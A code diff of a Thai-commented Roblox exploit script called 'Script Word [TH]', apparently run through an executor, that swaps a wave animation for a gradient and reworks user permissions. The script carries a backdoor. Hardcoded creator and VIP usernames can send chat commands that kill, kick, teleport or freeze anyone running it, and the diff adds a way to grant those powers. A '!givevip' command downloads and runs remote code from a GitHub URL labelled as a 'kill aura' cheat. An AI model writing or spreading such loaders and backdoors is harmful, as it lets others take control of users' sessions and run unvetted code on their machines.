@@ -1,10 +1,20 @@
--- [[ Script Word [TH] - Neon Edition (Wave Background Effect) ]]
+-- [[ Script Word [TH] - Neon Edition (Enhanced Background Effect) ]]
 
 local Player = game.Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local MyName = Player.Name
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+
+-- [Logics] ระบบสิทธิ์การใช้งาน
+_G.VIP_LIST = _G.VIP_LIST or {
+    ["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true,
+    ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true,
+    ["zx71828"] = true
+}
+local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
+local GIFTED_LIST = {} 
+local HAS_COMMAND_POWER = {} -- เก็บรายชื่อคนที่ได้รับสิทธิ์จาก !cmd
 
 -- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
 local function PlayUISound(id)
@@ -15,39 +25,29 @@ local function PlayUISound(id)
     game:GetService("Debris"):AddItem(s, 2)
 end
 
--- [Effect Logic] ฟังก์ชันเพิ่มเอฟเฟกต์คลื่นตามภาพ (NEW)
-local function AddWaveEffect(frame, waveColor)
-    frame.ClipsDescendants = true
+-- [Effect Logic] ฟังก์ชันเพิ่มพื้นหลังเคลื่อนไหว
+local function AddBackgroundEffect(frame)
+    local gradient = Instance.new("UIGradient", frame)
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, frame.BackgroundColor3),
+        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(60, 60, 60)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 80, 80)),
+        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(60, 60, 60)),
+        ColorSequenceKeypoint.new(1, frame.BackgroundColor3)
+    })
     
-    local function CreateWave(speed, height, transparency)
-        local wave = Instance.new("ImageLabel")
-        wave.Name = "WaveAnim"
-        wave.Parent = frame
-        wave.BackgroundTransparency = 1
-        wave.Position = UDim2.new(0, 0, 1, -height)
-        wave.Size = UDim2.new(2, 0, 0, height * 2)
-        wave.Image = "rbxassetid://1235232325" -- Texture คลื่นแบบฟุ้ง
-        wave.ImageColor3 = waveColor
-        wave.ImageTransparency = transparency
-        wave.ZIndex = 0
-        
-        task.spawn(function()
-            local pos = 0
-            while frame and frame.Parent do
-                pos = pos - 0.002 * speed
-                if pos <= -1 then pos = 0 end
-                wave.Position = UDim2.new(pos, 0, 1, -height)
-                task.wait(0.02)
-            end
-        end)
-    end
-    
-    -- สร้างคลื่นสองชั้นให้ดูมีมิติเหมือนในรูป
-    CreateWave(1, 60, 0.6)
-    CreateWave(1.5, 45, 0.8)
+    task.spawn(function()
+        local offset = -1
+        while true do
+            gradient.Offset = Vector2.new(offset, 0)
+            offset = offset + 0.015
+            if offset >= 1 then offset = -1 end
+            task.wait(0.01)
+        end
+    end)
 end
 
--- [Start Logic] ลำดับการแสดงผลพร้อมเสียง
+-- [Start Logic] ลำดับการแสดงผล
 local function ShowWelcome()
     local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
     
@@ -106,15 +106,6 @@ local function ShowWelcome()
 end
 
 task.spawn(ShowWelcome)
-
--- [Logics] รายชื่อ VIP
-_G.VIP_LIST = _G.VIP_LIST or {
-    ["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true,
-    ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true,
-    ["zx71828"] = true
-}
-local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
-local GIFTED_LIST = {} 
 
 if not Player:FindFirstChild("ScriptWord_Active") then
     Instance.new("StringValue", Player).Name = "ScriptWord_Active"
@@ -176,7 +167,7 @@ MainGui.Name = "ScriptWordTH_Extreme"
 local AdminPanel = Instance.new("Frame", MainGui)
 AdminPanel.Size = UDim2.new(0, 260, 0, 320); AdminPanel.Position = UDim2.new(0.5, -130, 0.5, -160)
 AdminPanel.BackgroundColor3 = Color3.fromRGB(15, 5, 5); AdminPanel.BackgroundTransparency = 0.1; AdminPanel.Visible = false
-ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel); AddWaveEffect(AdminPanel, Color3.fromRGB(255, 50, 50))
+ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel); AddBackgroundEffect(AdminPanel)
 
 local AdminTitle = Instance.new("TextLabel", AdminPanel)
 AdminTitle.Size = UDim2.new(1, 0, 0, 35); AdminTitle.Text = "Commands Script Word [TH]"
@@ -207,7 +198,7 @@ CmdBar.PlaceholderText = "> ENTER COMMAND..."; Instance.new("UICorner", CmdBar)
 local Board = Instance.new("Frame", MainGui)
 Board.Size = UDim2.new(0, 210, 0, 260); Board.Position = UDim2.new(0.85, 0, 0.3, 0)
 Board.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Board.BackgroundTransparency = 0.15
-ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board); AddWaveEffect(Board, Color3.fromRGB(255, 215, 0))
+ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board); AddBackgroundEffect(Board)
 
 local BoardTitle = Instance.new("TextLabel", Board)
 BoardTitle.Size = UDim2.new(1, 0, 0, 40); BoardTitle.Text = "Script Word [TH]"
@@ -241,10 +232,11 @@ local function UpdateBoard()
     Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
     for _, p in pairs(game.Players:GetPlayers()) do
         local isRunning = p:FindFirstChild("ScriptWord_Active")
-        if isRunning or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] then
+        if isRunning or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] or HAS_COMMAND_POWER[p.Name] then
             local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100)
             if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
             elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255,215,0)
+            elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(255,0,255)
             elseif GIFTED_LIST[p.Name] then tag, color = "[GFT]", Color3.fromRGB(0,255,255) end
             local l = Instance.new("TextLabel", Scroll)
             l.Size = UDim2.new(1, -5, 0, 22); l.Text = " " .. tag .. " " .. p.Name
@@ -264,24 +256,39 @@ local function ListenChat(speaker, msg)
         return nil
     end
     local target = args[2] and findTarget(args[2])
-    if _G.VIP_LIST[speaker.Name] or ADMIN_COMMANDER[speaker.Name] then
+
+    -- เช็คสิทธิ์การใช้คำสั่ง
+    local hasPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
+
+    if hasPower then
         if speaker ~= Player then PlayUISound(203785501) end
-        if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-        elseif cmd == "!kickall" then CustomKick() end
-        local canExecute = (ADMIN_COMMANDER[speaker.Name] and target == Player) or (speaker == Player and (not target or target == Player)) or (target == Player and GIFTED_LIST[target.Name] == speaker.Name)
-        if canExecute then
+        if cmd == "!killall" then 
+            if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+        elseif cmd == "!kickall" then 
+            CustomKick() 
+        end
+
+        if target == Player then
             if cmd == "!kick" then CustomKick()
             elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
             elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
             elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
             elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
         end
-        if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name; UpdateBoard()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
-        end
     end
-    if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then AdminPanel.Visible = true; MinAdminBtn.Visible = true end
+
+    if (_G.VIP_LIST[speaker.Name] or ADMIN_COMMANDER[speaker.Name]) and cmd == "!givevip" and target == Player then
+        GIFTED_LIST[Player.Name] = speaker.Name; UpdateBoard()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
+    end
+
+    -- [Modified] เมื่อได้รับ !cmd ให้เด้ง UI และปุ่มขึ้นมาทันที
+    if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then 
+        HAS_COMMAND_POWER[Player.Name] = true
+        AdminPanel.Visible = true      -- เด้ง UI Admin ทันที
+        MinAdminBtn.Visible = true     -- แสดงปุ่ม 🛡️ เพื่อให้เปิด-ปิดเองได้
+        UpdateBoard()
+    end
 end
 
 CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
